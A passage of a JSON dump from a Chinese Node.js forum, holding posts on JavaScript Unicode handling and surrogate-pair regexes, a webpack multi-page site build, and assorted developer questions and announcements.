language-javascript\"><code>    &gt;&gt; &#x2F;^.$&#x2F;.test(&#x27;💩&#x27;)\n    false\n</code></pre><p>为了正确匹配换行符，我们可以使用 <code>[\\s\\S]</code> 来代替，但这仍然不能匹配整个位于辅助平面上的字符。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x2F;^[\\s\\S]$&#x2F;.test(&#x27;💩&#x27;)\n    false\n</code></pre><p>事实证明，匹配任何 Unicode 编码点的正则表达式一点也不简单:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x2F;[\\0-\\uD7FF\\uE000-\\uFFFF]|[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]|[\\uD800-\\uDBFF](?![\\uDC00-\\uDFFF])|(?:[^\\uD800-\\uDBFF]|^)[\\uDC00-\\uDFFF]&#x2F;.test(&#x27;💩&#x27;) &#x2F;&#x2F; wtf\n    true\n</code></pre><p>当然，你不希望手工编写这些正则表达式，更不用说调试它们了。为了生成像上面的一个正则表达式，可以使用了一个名为 <a href=\"https://github.com/mathiasbynens/regenerate\">Regenerate</a>的库，它可以根据码位或字符列表轻松地创建正则表达式:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; regenerate().addRange(0x0, 0x10FFFF).toString()\n    &#x27;[\\0-\\uD7FF\\uE000-\\uFFFF]|[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]|[\\uD800-\\uDBFF](?![\\uDC00-\\uDFFF])|(?:[^\\uD800-\\uDBFF]|^)[\\uDC00-\\uDFFF]&#x27;\n</code></pre><p>从左到右，这个正则表达式匹配BMP字符、代理项对或单个代理项。</p>\n<p>虽然在 JavaScript 字符串中技术上允许使用单独的代理，但是它们本身并不映射到任何字符，因此应该避免使用。术语 <a href=\"http://www.unicode.org/glossary/#unicode_scalar_value\">Unicode标量值</a> 指除代理码位之外的所有码位。下面是一个正则表达式，它匹配任何 Unicode 标量值:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; regenerate()\n         .addRange(0x0, 0x10FFFF)     &#x2F;&#x2F; all Unicode code points\n         .removeRange(0xD800, 0xDBFF) &#x2F;&#x2F; minus high surrogates\n         .removeRange(0xDC00, 0xDFFF) &#x2F;&#x2F; minus low surrogates\n         .toRegExp()\n    &#x2F;[\\0-\\uD7FF\\uE000-\\uFFFF]|[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]&#x2F;\n</code></pre><p><a href=\"https://github.com/mathiasbynens/regenerate\">Regenerate</a>作为构建脚本的一部分使用的，用于创建复杂的正则表达式，同时仍然保持生成这些表达式的脚本的可读性和易于维护。</p>\n<p>ECMAScript 6 为正则表达式引入一个 <code>u</code> 标志，它会使用 <code>.</code> 操作符匹配整个码位，而不是代理项的一半。</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x2F;foo.bar&#x2F;.test(&#x27;foo💩bar&#x27;)\n    false\n    \n    &gt;&gt; &#x2F;foo.bar&#x2F;u.test(&#x27;foo💩bar&#x27;)\n    true\n</code></pre><p>注意  <code>.</code> 操作符仍然不会匹配换行符，设置 <code>u</code> 标志时，<code>.</code> 操作符等效于以下向后兼容的正则表达式模式：</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; regenerate()\n         .addRange(0x0, 0x10FFFF) &#x2F;&#x2F; all Unicode code points\n         .remove(  &#x2F;&#x2F; minus &#96;LineTerminator&#96;s (https:&#x2F;&#x2F;ecma-international.org&#x2F;ecma-262&#x2F;5.1&#x2F;#sec-7.3):\n           0x000A, &#x2F;&#x2F; Line Feed &lt;LF&gt;\n           0x000D, &#x2F;&#x2F; Carriage Return &lt;CR&gt;\n           0x2028, &#x2F;&#x2F; Line Separator &lt;LS&gt;\n           0x2029  &#x2F;&#x2F; Paragraph Separator &lt;PS&gt;\n         )\n         .toString();\n    &#x27;[\\0-\\t\\x0B\\f\\x0E-\\u2027\\u202A-\\uD7FF\\uE000-\\uFFFF]|[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]|[\\uD800-\\uDBFF](?![\\uDC00-\\uDFFF])|(?:[^\\uD800-\\uDBFF]|^)[\\uDC00-\\uDFFF]&#x27;\n    \n    &gt;&gt; &#x2F;foo(?:[\\0-\\t\\x0B\\f\\x0E-\\u2027\\u202A-\\uD7FF\\uE000-\\uFFFF]|[\\uD800-\\uDBFF][\\uDC00-\\uDFFF]|[\\uD800-\\uDBFF](?![\\uDC00-\\uDFFF])|(?:[^\\uD800-\\uDBFF]|^)[\\uDC00-\\uDFFF])bar&#x2F;u.test(&#x27;foo💩bar&#x27;)\n    true\n</code></pre><h4><strong>位于辅助平面码位上的字符</strong></h4>\n<p>考虑到 <code>/[a-c]/</code> 匹配任何字符从 码位为 <code>U+0061</code> 的字母 a 到 码位为 <code>U+0063</code> 的字母 c,似乎/[💩-💫]/ 会匹配码位 <code>U+1F4A9</code> 到码位 <code>U+1F4AB</code>，然而事实并非如此：</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x2F;[💩-💫]&#x2F;\n    SyntaxError: Invalid regular expression: Range out of order in character class\n</code></pre><p>发生这种情况的原因是，正则表达式等价于:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x2F;[\\uD83D\\uDCA9-\\uD83D\\uDCAB]&#x2F;\n    SyntaxError: Invalid regular expression: Range out of order in character class\n</code></pre><p>事实证明，不像我们想的那样匹配码位 <code>U+1F4A9</code> 到码位 <code>U+1F4AB</code>，而是匹配正则表达式:</p>\n<ul>\n<li>\n<p>U+D83D(高代理位)</p>\n</li>\n<li>\n<p>从 <code>U+DCA9</code> 到 <code>U+D83D</code> 的范围（无效，因为起始码位大于标记范围结束的码位）</p>\n</li>\n<li>\n<p>U+DCAB(低代理位)</p>\n</li>\n</ul>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; &#x2F;[\\uD83D\\uDCA9-\\uD83D\\uDCAB]&#x2F;u.test(&#x27;\\uD83D\\uDCA9&#x27;) &#x2F;&#x2F; match U+1F4A9\n    true\n    \n    &gt;&gt; &#x2F;[\\u{1F4A9}-\\u{1F4AB}]&#x2F;u.test(&#x27;\\u{1F4A9}&#x27;) &#x2F;&#x2F; match U+1F4A9\n    true\n    \n    &gt;&gt; &#x2F;[💩-💫]&#x2F;u.test(&#x27;💩&#x27;) &#x2F;&#x2F; match U+1F4A9\n    true\n    \n    &gt;&gt; &#x2F;[\\uD83D\\uDCA9-\\uD83D\\uDCAB]&#x2F;u.test(&#x27;\\uD83D\\uDCAA&#x27;) &#x2F;&#x2F; match U+1F4AA\n    true\n    \n    &gt;&gt; &#x2F;[\\u{1F4A9}-\\u{1F4AB}]&#x2F;u.test(&#x27;\\u{1F4AA}&#x27;) &#x2F;&#x2F; match U+1F4AA\n    true\n    \n    &gt;&gt; &#x2F;[💩-💫]&#x2F;u.test(&#x27;💪&#x27;) &#x2F;&#x2F; match U+1F4AA\n    true\n    \n    &gt;&gt; &#x2F;[\\uD83D\\uDCA9-\\uD83D\\uDCAB]&#x2F;u.test(&#x27;\\uD83D\\uDCAB&#x27;) &#x2F;&#x2F; match U+1F4AB\n    true\n    \n    &gt;&gt; &#x2F;[\\u{1F4A9}-\\u{1F4AB}]&#x2F;u.test(&#x27;\\u{1F4AB}&#x27;) &#x2F;&#x2F; match U+1F4AB\n    true\n    \n    &gt;&gt; &#x2F;[💩-💫]&#x2F;u.test(&#x27;💫&#x27;) &#x2F;&#x2F; match U+1F4AB\n    true\n</code></pre><p>遗憾的是，这个解决方案不能向后兼容 ECMAScript 5 和更旧的环境。如果这是一个问题，应该使用 Regenerate 生成 es5兼容的正则表达式，处理辅助平面范围内的字符:</p>\n<pre class=\"prettyprint language-javascript\"><code>    &gt;&gt; regenerate().addRange(&#x27;💩&#x27;, &#x27;💫&#x27;)\n    &#x27;\\uD83D[\\uDCA9-\\uDCAB]&#x27;\n    \n    &gt;&gt; &#x2F;^\\uD83D[\\uDCA9-\\uDCAB]$&#x2F;.test(&#x27;💩&#x27;) &#x2F;&#x2F; match U+1F4A9\n    true\n    \n    &gt;&gt; &#x2F;^\\uD83D[\\uDCA9-\\uDCAB]$&#x2F;.test(&#x27;💪&#x27;) &#x2F;&#x2F; match U+1F4AA\n    true\n    \n    &gt;&gt; &#x2F;^\\uD83D[\\uDCA9-\\uDCAB]$&#x2F;.test(&#x27;💫&#x27;) &#x2F;&#x2F; match U+1F4AB\n    true\n</code></pre><h3>实战中的 bug 以及如何避免它们</h3>\n<p>这种行为会导致许多问题。例如，Twitter 每条 tweet 允许 140 个字符，而它们的后端并不介意它是什么类型的字符——是否为辅助平面内的字符。但由于JavaScript 计数在其网站上的某个时间点只是读出字符串的长度，而不考虑代理项对，因此不可能输入超过 70 个辅助平面内的字符。(这个bug已经修复。)</p>\n<p>许多处理字符串的JavaScript库不能正确地解析辅助平面内的字符。</p>\n<p>例如，Countable.js 它没有正确计算辅助平面内的字符。</p>\n<p><code>Underscore.string</code> 有一个 <strong>reverse</strong> 方法，它不处理组合标记或辅助平面内的字符。(改用 <strong>Missy Elliot</strong> 的算法)</p>\n<p>它还错误地解码辅助平面内的字符的 HTML 数字实体，例如 <code>&amp;#x1F4A9;</code>。 许多其他 HTML 实体转换库也存在类似的问题。(在修复这些错误之前，请考虑使用 <a href=\"https://github.com/mathiasbynens/he\">he</a> 代替所有 HTML 编码/解码需求。)</p>\n<p><strong>原文:</strong></p>\n<p><a href=\"https://firebase.google.com/docs/cloud-messaging/\">https://firebase.google.com/docs/cloud-messaging/</a></p>\n<p><strong>代码部署后可能存在的BUG没法实时知道，事后为了解决这些BUG，花了大量的时间进行log 调试，这边顺便给大家推荐一个好用的BUG监控工具 <a href=\"https://www.fundebug.com/?utm_source=xiaozhi\">Fundebug</a>。</strong></p>\n<p><strong>你的点赞是我持续分享好东西的动力，欢迎点赞！</strong></p>\n<p><strong>一个笨笨的码农，我的世界只能终身学习！</strong></p>\n<p><strong>更多内容请关注公众号《大迁世界》！</strong></p>\n<h3>关于Fundebug</h3>\n<p><a href=\"https://www.fundebug.com/\">Fundebug</a>专注于JavaScript、微信小程序、微信小游戏、支付宝小程序、React Native、Node.js和Java线上应用实时BUG监控。 自从2016年双十一正式上线，Fundebug累计处理了9亿+错误事件，付费客户有Google、360、金山软件、百姓网等众多品牌企业。欢迎大家<a href=\"https://www.fundebug.com/team/create\">免费试用</a>！</p>\n<p><img src=\"https://static.fundebug.cn/wechat_slogan.png\" alt></p>\n</div>","title":"JavaScript如何正确处理Unicode编码问题！","last_reply_at":"2019-01-07T16:25:45.317Z","good":false,"top":false,"reply_count":1,"visit_count":612,"create_at":"2019-01-07T02:03:32.721Z","author":{"loginname":"Fundebug","avatar_url":"https://avatars2.githubusercontent.com/u/26496557?v=4&s=120"}},{"id":"5c3361063898674067a7c401","author_id":"5a4b401599d207fa49f5cb1d","tab":"share","content":"<div class=\"markdown-text\"><p>最近，一直尝试使用webpack做多页面应用的开发。并且一个实际的项目为原型，实现对一个静态的企业站进行优化。原站点<a href=\"http://www.sjcf.com.cn/\">地址</a>，测试站点<a href=\"http://39.105.223.81:8083\">地址</a>。</p>\n<p>如果想要做一个自己个个人博客，或者企业官网来说，有一定的参考意义。喜欢的同学，请不要吝啬<a href=\"https://github.com/lvzhenbang/webpack4.x-multi-page\">star</a>一下。</p>\n<h2>webpack + pug</h2>\n<p>项目中使用了webpack进行构建，使用pug编译器可以减少开发过程中的html代码。</p>\n<h2>webpack的<code>resolve.alias</code></h2>\n<p>在做模块化开发的过程中，有一个需要解决的问题就是引用模块的路径问题。</p>\n<p>注：在webpack中，每一个文件（不管是js，css, html，还是图片等）都被称之为一个块。</p>\n<p>为了实现模块化，细粒度化的控制，往往会将代码块分成为不可分割的块，这样做虽然方便了管理控制，但是也会造成项目的文件嵌套很严重，再饮用的时候需要格外小心路径，同时也会造成开发者的负担（抛开其他不讲，但从技术角度来说，对于开发人员来说，能用一行代码解决的问题，绝不用两行，能少输入一个单词就少输入一个）。</p>\n<p>而webpack的<code>resolve.alias</code>可以为指定路径的字符串起别名。在本文所使用的示例，这样定义别名：</p>\n<pre class=\"prettyprint\"><code>...\nresolve: {\n  alias: {\n    &#x27;@&#x27;: path.join(__dirname, &#x27;..&#x27;, &#x27;pages&#x2F;&#x27;), &#x2F;&#x2F; 根目录\n    &#x27;@css&#x27;: path.join(__dirname, &#x27;assets&#x2F;css&#x2F;&#x27;), &#x2F;&#x2F; css\n    &#x27;@img&#x27;: path.join(__dirname, &#x27;assets&#x2F;imgs&#x2F;&#x27;), &#x2F;&#x2F; picture\n    &#x2F;&#x2F; &#x27;@font&#x27;: path.join(__dirname, &#x27;assets&#x2F;fonts&#x2F;&#x27;),\n    &#x27;@data&#x27;: path.join(__dirname, &#x27;pages&#x2F;data&#x2F;&#x27;), &#x2F;&#x2F; mock data\n    &#x27;@utils&#x27;: path.join(__dirname, &#x27;pages&#x2F;utils&#x2F;&#x27;) &#x2F;&#x2F; snippets code\n  }\n},\n...\n</code></pre><p>当然，上面的别名并不是万能的，有一个问题就是<code>background-iamge</code> 和 <code>font-face</code> 的使用<code>url()</code>会有一些问题，<code>url()</code>中的路径必须是字符串，暂时没有好的办法解决。</p>\n<p>但是使用<code>sass</code>，可以定义变量，可以通过变量来指定路径，但是要严格控制引用变量模块的文件的目录，在本文所使用的示例中，统一将应用变量文件<code>assets/css/path.scss</code>的文件，控制在两个层级。具体可参考所提供源代码中的具体使用。</p>\n<h2>模拟数据</h2>\n<p>实际的项目没有使用任何一种语言的后端代码，更不用说数据库。全部使用的是模拟数据。</p>\n<p>为了方便管理维护项目的模拟数据，将项目的所有数据统一整理到了<a href=\"https://github.com/lvzhenbang/webpack4.x-multi-page\">示例</a>的<a href=\"https://github.com/lvzhenbang/webpack4.x-multi-page/tree/master/pages\"><code>pages/data</code></a>目录下。</p>\n<h2>静态资源图片的处理</h2>\n<p>第一优化的时候，就简单的讲了下，如何使用<a href=\"https://github.com/imagemin\">imagemin</a>提供的插件，来实现对常见类型（<em>.jpg，</em>.png，*.gif）图片的处理。</p>\n<h3>第一种引用图片的方案</h3>\n<p>之前做单页面应用开发的时候，喜欢将所有的图片优化处理后统一放在一个目录中，然后将它们放在服务器中，最后在开发或生产环境中，使用绝对路径进行访问。</p>\n<p>这种方式的好处是不用担心相对路径造成的路径问题。但是缺点是，操作起来不方便，尤其是开发环境。因为你不知道项目究竟要使用多少的静态资源，尤其是使用哪种静态资源。</p>\n<p>这种方式在团队合作的项目中，比较常见，但是对于提升团队的效率并不明显。</p>\n<h3>第二种引用图片的方案</h3>\n<p>所以，对于开发者来说，如果如果需要什么静态资源，就放在自己的本地目录，这样可以随心所欲的添加。</p>\n<p>在本文所采用的示例中，我做了一些尝试，将所有的图片资源进行了分类。</p>\n<ul>\n<li>需要转化为base64的图片放一个文件夹<a href=\"https://github.com/lvzhenbang/webpack4.x-multi-page/tree/master/assets/imgs/base64\"><code>assets/imgs/base64/</code></a>；</li>\n<li>需要合成雪碧图的单独放在一个文件夹，<a href=\"https://github.com/lvzhenbang/webpack4.x-multi-page/tree/master/assets/imgs/sprites\"><code>assets/imgs/sprites/</code></a>，为了方便管理合成不同雪碧图的源图片，我又在该目录下创建了子文件夹；</li>\n<li>而对于<code>&lt;img src=&quot;...&quot; /&gt;</code>要引用的图片的存放使用了两个文件夹，<a href=\"https://github.com/lvzhenbang/webpack4.x-multi-page/tree/master/assets/imgs/static\"><code>assets/imgs/static</code></a>存放了未经优化的所有的图片，而目录<a href=\"https://github.com/lvzhenbang/webpack4.x-multi-page/tree/master/assets/imgs/others\"><code>assets/imgs/others</code></a>，存放了所有优化过的图片（包含两部分，一部分是使用<code>npm run img</code>命令优化的<code>assets/imgs/static</code>目录下的图片，另一部分是<code>npm run dev</code>命令优化的雪碧图图片，它的前缀带有<code>*-sprite</code>这样的后缀）。</li>\n</ul>\n<p>这种方案，使用的是相对路径应用图片。可参考<code>pages/data/contactus.js</code>文件的代码：</p>\n<pre class=\"prettyprint\"><code>const loadImg = require(&#x27;@utils&#x2F;load-img&#x27;)\n\nmodule.exports = {\n  cn_name: &#x27;联系我们&#x27;,\n  en_name: &#x27;CONTACT US&#x27;,\n  img: loadImg(&#x27;second&#x2F;contactus-tag.png&#x27;),\n  ...\n}\n</code></pre><p>而工具代码片段loadImg的代码如下：</p>\n<pre class=\"prettyprint\"><code>module.exports = function(str) {\n  return require(&#x27;@img&#x2F;other&#x2F;&#x27; + str)\n}\n</code></pre><h2>模拟类似vue单页面的路由跳转</h2>\n<p><img src=\"https://github.com/lvzhenbang/webpack-learning/tree/master/imgs/animate.gif\" alt=\"最终的效果\"></p>\n<p>很明显的一点是传统的多页面应用的业务模块往往会出现多个页面之间会有很多相同内容，这样在单击导航实现路由切换的时候，总是会看到相同的内容，这样会给用户造成一种错觉‘为什么总是同一个页面’。这样的用户体验往往不好。最突出的就是包含二级导航的页面。（可参考<a href=\"http://www.sjcf.com.cn/zjsj-sjtz.html\">圣捷集团的官网</a>）</p>\n<p>单页面应用给我们了一个很好的启示，可以通过将这些页面结构相似的，而只有一部分内容类同的页面组合成为一个页面。</p>\n<p>这样做的好处显而易见，减少多页面构建生成的页面数量，我们之构建生成一级和二级页面，以及一些页面结构很少雷同的页面，而不构建生成三级页面。</p>\n<p>优化后的<a href=\"http://39.105.223.81:8083/zjsj.html\">示例地址</a></p>\n<p>具体的实现有两种解决方案。</p>\n<p>第一种，在每个页面中使用一个vue（结合vue-router）的示例（也可以使用，react，angular）。</p>\n<p>第二种，自己实现对不同<code>hash</code>的处理。</p>\n<p>注：如果使用hash，在开发的时候一定要模拟一个服务器环境，直接用浏览器打开是无法实现的，浏览器控制台会提示跨域的错误。</p>\n<p>本文所使用的示例用的是第二种方案。</p>\n<p>具体的实现过程如下：</p>\n<p>在生成子导航的模拟数据中添加了一个<code>type</code>值。</p>\n<pre class=\"prettyprint\"><code>tabs: [\n  {\n    cn_name: &#x27;圣捷投资&#x27;,\n    en_name: &#x27;SHENGJIE INVESTMENT&#x27;,\n    type: &#x27;investment&#x27;\n  }, {\n    cn_name: &#x27;董事长致辞&#x27;,\n    en_name: &#x27;CHAIRMANS SPEECH&#x27;,\n    type: &#x27;speech&#x27;\n  }\n  ...\n]\n</code></pre><p>这样使用<code>pug-loader</code>处理生成的html对应的元素中会包含一个<code>data-type</code>自定义属性。参考代码如下：</p>\n<pre class=\"prettyprint\"><code>&lt;div class=&quot;tabs&quot;&gt;\n  &lt;div class=&quot;tab-item active&quot; data-type=&quot;finance&quot;&gt;\n    &lt;div&gt;互联网金融&lt;&#x2F;div&gt;\n    &lt;div&gt;ONLINE FINANCE&lt;&#x2F;div&gt;\n  &lt;&#x2F;div&gt;\n  &lt;div class=&quot;tab-item&quot; data-type=&quot;allfinance&quot;&gt;\n    &lt;div&gt;全品类金融&lt;&#x2F;div&gt;\n    &lt;div&gt;WHOLE CATEGORY FINANCE&lt;&#x2F;div&gt;\n  &lt;&#x2F;div&gt;\n  ...\n&lt;&#x2F;div&gt;\n</code></pre><p>然后，使用JavaScript通过控制触发条件，如url的hash改变，进而控制页面的展示效果。参考代码如下：</p>\n<pre class=\"prettyprint\"><code>···\n$(&#x27;.tab-item&#x27;).on(&#x27;click&#x27;, function() {\n  var type = $(this).data(&#x27;type&#x27;)\n  window.location.hash = type\n  tab(this, type)\n})\n···\n</code></pre><p>首先，单点击二级导航时，改变url的hash。这样做可以让用户通过操作浏览器的<code>前进和后退</code>按钮来控制页面，此外使用浏览器的<code>前进和后退按钮</code>的好处是，浏览可以记录页面的状态。（只用上面的代码无法实现想要的效果）</p>\n<p>其次，使用<code>hashchange</code>这个浏览器自带的监听hash改变的api（他兼容&gt;=ie8的浏览器，所以可以放心使用）。</p>\n<pre class=\"prettyprint\"><code>···\n$(window).on(&#x27;hashchange&#x27;, function() {\n  tabcheck()\n})\n···\n</code></pre><p>通过它们，就可以轻松的实现url的<code>hash</code>。</p>\n<p>为了页面呈现更好的效果，可以给页面添加一个<code>滚动的动画</code>，如果不使用<code>hash</code>在传统的页面中实现有些棘手。</p>\n<p>那么针对页面底部的网站导航，如何结合<code>hash</code>来操作页面并实现一致的路由切换效果呢？</p>\n<p>这里需要监听页面的<code>load</code>状态，在webpack中，使用<code>commonjs</code>来组织js代码块，需要注意<code>window.load(...)</code>无效的情况。</p>\n<p>具体的实现就不一一介绍了，可参考<a href=\"https://github.com/lvzhenbang/webpack4.x-multi-page/blob/master/pages/utils/tabs.js\">demo中tabs.js文件的代码</a></p>\n<h2>源代码</h2>\n<p><a href=\"https://github.com/lvzhenbang/webpack4.x-multi-page\">webpack4.x multi-page</a></p>\n</div>","title":"webpack 构建多页面应用，快速生成一个静态站","last_reply_at":"2019-01-07T14:24:06.056Z","good":false,"top":false,"reply_count":0,"visit_count":674,"create_at":"2019-01-07T14:24:06.056Z","author":{"loginname":"lvzhenbang","avatar_url":"https://avatars2.githubusercontent.com/u/19884132?v=4&s=120"}},{"id":"51d29d5dd44cbfa304168f66","author_id":"51d29caad44cbfa3041670a9","content":"<div class=\"markdown-text\"><p>求解答，非常紧急。</p>\n</div>","title":"服务端使用socket.io编写，客户端也必须使用socket.io吗，可以直接使用浏览器提供的websocket对象吗？","last_reply_at":"2019-01-07T12:43:56.644Z","good":false,"top":false,"reply_count":14,"visit_count":12416,"create_at":"2013-07-02T09:29:01.445Z","author":{"loginname":"sleefd","avatar_url":"//gravatar.com/avatar/c51bc3f396be25b97dc51f0e6232ce77?size=48"}},{"id":"5c2d74113898674067a7a779","author_id":"5a72ca56ce45d440451465c6","tab":"ask","content":"<div class=\"markdown-text\"><p>如题，聊天数据表的结构大概为 【自增id,  角色ID  ,   时间， 对象ID， 聊天内容】，怎么找出10分钟内私聊了5个人以上的角色呀？？或者node.js有没有类似做数据分析的包</p>\n</div>","title":"一张mysql聊天记录表，如何分析出10分钟内哪个角色私聊了5个人以上","last_reply_at":"2019-01-07T12:30:07.324Z","good":false,"top":false,"reply_count":6,"visit_count":958,"create_at":"2019-01-03T02:31:45.938Z","author":{"loginname":"heguangda","avatar_url":"https://avatars1.githubusercontent.com/u/29668335?v=4&s=120"}},{"id":"5c3346225bf06c5e7e3f2484","author_id":"5c1b04c03898674067a76417","tab":"ask","content":"<div class=\"markdown-text\"><p>使用 npm link 本地的一个包，老是报 cannot find module，但是明明已经安装了这些包。</p>\n<p>1、link 了本地的一个包</p>\n<p><img src=\"//static.cnodejs.org/FgaQv84i4CfLk154geRah4aPN9Xd\" alt=\"image.png\"></p>\n<p>2、报错本地包缺少依赖\n<img src=\"//static.cnodejs.org/FnSopBllDdlpeTDOi4G29Z0Hd9k1\" alt=\"image.png\"></p>\n<p>3、本地包里面明明安装了这个依赖呀\n<img src=\"//static.cnodejs.org/Frz6QreerJZPxJDaqe08TeeN_VhH\" alt=\"image.png\"></p>\n</div>","title":"请教一个 npm link 的问题~~","last_reply_at":"2019-01-07T12:29:22.926Z","good":false,"top":false,"reply_count":0,"visit_count":493,"create_at":"2019-01-07T12:29:22.926Z","author":{"loginname":"didiaohu","avatar_url":"https://avatars0.githubusercontent.com/u/19411940?v=4&s=120"}},{"id":"5c31f9d43898674067a7bc44","author_id":"5c2f299a5bf06c5e7e3f15d5","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://juejin.im/post/5c2cd89bf265da61290a4a5a\">Koa2第一篇: 图解Hello World学习源码</a></p>\n</div>","title":"Koa2第一篇: 图解Hello World学习源码","last_reply_at":"2019-01-07T08:47:32.099Z","good":false,"top":false,"reply_count":2,"visit_count":690,"create_at":"2019-01-06T12:51:32.289Z","author":{"loginname":"NuoHui","avatar_url":"https://avatars2.githubusercontent.com/u/42414989?v=4&s=120"}},{"id":"5c32e6e63898674067a7c019","author_id":"505c207410ccdf807706d44a","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"//static.cnodejs.org/FsqtSxpovK5s1RiVlOWEIjIxQtxC\" alt=\"crop.gif\">\n在线预览：<a href=\"http://seejs.me/crop-in-page/\">网页截图插件</a></p>\n</div>","title":"做了一个网页截图插件，不知道有没有啥价值","last_reply_at":"2019-01-07T07:42:09.726Z","good":false,"top":false,"reply_count":1,"visit_count":718,"create_at":"2019-01-07T05:43:02.968Z","author":{"loginname":"mailzwj","avatar_url":"https://avatars1.githubusercontent.com/u/1563970?v=4&s=120"}},{"id":"5c32ff313898674067a7c10a","author_id":"5b03c9a7000332b81cf821a5","tab":"ask","content":"<div class=\"markdown-text\"><p>二叉树，二叉搜索树，二叉平衡树，红黑树，b+树，b*树。</p>\n</div>","title":"同志们还记得实现各种树的算法吗？","last_reply_at":"2019-01-07T07:27:58.063Z","good":false,"top":false,"reply_count":1,"visit_count":666,"create_at":"2019-01-07T07:26:41.660Z","author":{"loginname":"linxiaoziruo","avatar_url":"https://avatars3.githubusercontent.com/u/6881273?v=4&s=120"}},{"id":"5c32b0f13898674067a7bdd7","author_id":"54475fdf649ac9220757b8ed","tab":"share","content":"<div class=\"markdown-text\"><p><img src=\"https://dn-coding-net-production-pp.codehub.cn/ff204ffa-6e03-45c5-9ae4-04a585fe1a7d.png\" alt=\"图片\"></p>\n<p><strong><a href=\"https://studio.qcloud.coding.net/campaign/favorite-plugins/\">『我最喜爱的 Cloud Studio 插件评选大赛』</a><strong>已经进入了评分抽奖环节~\n从今天开始\n连续三周的</strong>周一 18:00</strong>\n都将进行抽奖直播！</p>\n<p><strong>iPhone Xs Max</strong>\n<strong>PS4 Pro</strong>\n<strong>HHKB 机械键盘</strong>\n一周送一件！</p>\n<p>今天将率先送出 <strong>PS4 Pro</strong> 一台！\n还不快来了解一下领取方式~</p>\n<h3>参与方式：</h3>\n<p>登陆 <strong><a href=\"https://studio.qcloud.coding.net/campaign/favorite-plugins/\">活动官网</a></strong>\n对你喜爱的插件进行评分\n每周将在参与评分的账号中\n直播抽取一位幸运儿带走大礼</p>\n<h3>抽奖时间：</h3>\n<p>1 月 7 日、14 日、21 日\n18:00 准时开始</p>\n<p>抽奖过程将在大家的监督下\n通过<strong>斗鱼平台 - CODING 官方直播间</strong>播出\nCODING 的小哥哥小姐姐\n将陪你畅聊敲代码的那些事\n在直播过程中和我们互动\n还有<strong>猴子大礼包，话费</strong>等礼品相送</p>\n<p>扫码关注直播间\n或搜索直播间 ID：5806982\n不要错过你的获奖信息！</p>\n<p><img src=\"https://dn-coding-net-production-pp.codehub.cn/a68d4e52-b275-4c11-b369-8c0845ca4fdd.png\" alt=\"图片\"></p>\n<h2>插件推荐环节</h2>\n<p>经过一个多月的提交，我们收获了许多充满技术性、趣味性的插件\n今天向大家推荐三个高分插件</p>\n<h4>1、<a href=\"https://studio.dev.tencent.com/plugins/detail/21\">material 主题插件（官方插件不参与评选）</a></h4>\n<p>CloudStudio material-ui 主题插件包含两部分内容，一是 material-ui 代码高亮颜色主题，另一部分是 material-ui 主题的文件图标。\n可以自定义颜色，也能统一管理，经典主题值得拥有。</p>\n<h4>2、<a href=\"https://studio.dev.tencent.com/plugins/detail/462\">插件市场 | Plugins Market</a></h4>\n<p>必装插件之一，即插即用，无需配置，随心管理你的插件！</p>\n<h4>3、<a href=\"https://studio.dev.tencent.com/plugins/detail/264\">Vue 2 Snippets for Cloud Studio</a></h4>\n<p>用于 Cloud Studio 代码的 Vue 2 代码段，此扩展将 Vue 2 代码片段添加到 Cloud Studio 代码中。\n该插件基于最新的 Vue 2 的 API 添加了 Code Snippets。</p>\n<p><strong><a href=\"https://studio.qcloud.coding.net/campaign/favorite-plugins/\">『我最喜爱的 Cloud Studio 插件评选大赛』</a></strong> 仍在火热进行中\n点击 <a href=\"https://studio.qcloud.coding.net/campaign/favorite-plugins/\">活动首页</a>，快来提交你的插件，或者给你喜欢的插件评分吧！</p>\n</div>","title":"Cloud Studio 插件评选大赛，抽奖第一弹","last_reply_at":"2019-01-07T01:52:49.183Z","good":false,"top":false,"reply_count":0,"visit_count":528,"create_at":"2019-01-07T01:52:49.183Z","author":{"loginname":"zengliqi","avatar_url":"https://avatars1.githubusercontent.com/u/9347370?v=4&s=120"}},{"id":"5c31f9f83898674067a7bc48","author_id":"5c2f299a5bf06c5e7e3f15d5","tab":"share","content":"<div class=\"markdown-text\"><p><a href=\"https://juejin.im/post/5c31c6edf265da6158774d76\">koa2第二篇: 图解中间件源码执行过程</a></p>\n</div>","title":"koa2第二篇: 图解中间件源码执行过程","last_reply_at":"2019-01-06T12:52:08.781Z","good":false,"top":false,"reply_count":0,"visit_count":597,"create_at":"2019-01-06T12:52:08.781Z","author":{"loginname":"NuoHui","avatar_url":"https://avatars2.githubusercontent.com/u/42414989?v=4&s=120"}},{"id":"5a62b395afa0a121784a8de0","author_id":"590d7e623504ce1c2ac45912","tab":"share","content":"<div class=\"markdown-text\"><h2>JavaScript 中基础数据类型</h2>\n<table>\n<thead>\n<tr>\n<th>数据类型名称</th>\n<th>数据类型说明</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Undefined</td>\n<td>只有一个值，即 <code>undefined</code>，声明变量的初始值。</td>\n</tr>\n<tr>\n<td>Null</td>\n<td>只有一个值，即 <code>null</code>，表示空指针，<code>undefined</code> 的值是派生 <code>null</code> 的值。</td>\n</tr>\n<tr>\n<td>String</td>\n<td>由零或多个 16 位 <code>Unicode</code> 字符组成</td>\n</tr>\n<tr>\n<td>Boolean</td>\n<td>只有两个值，即 <code>true</code> 和 <code>false</code></td>\n</tr>\n<tr>\n<td>Number</td>\n<td>该类型使用 <code>IEEE754</code> 来表示整数和浮点数。</td>\n</tr>\n<tr>\n<td>Object</td>\n<td>ECMAScript 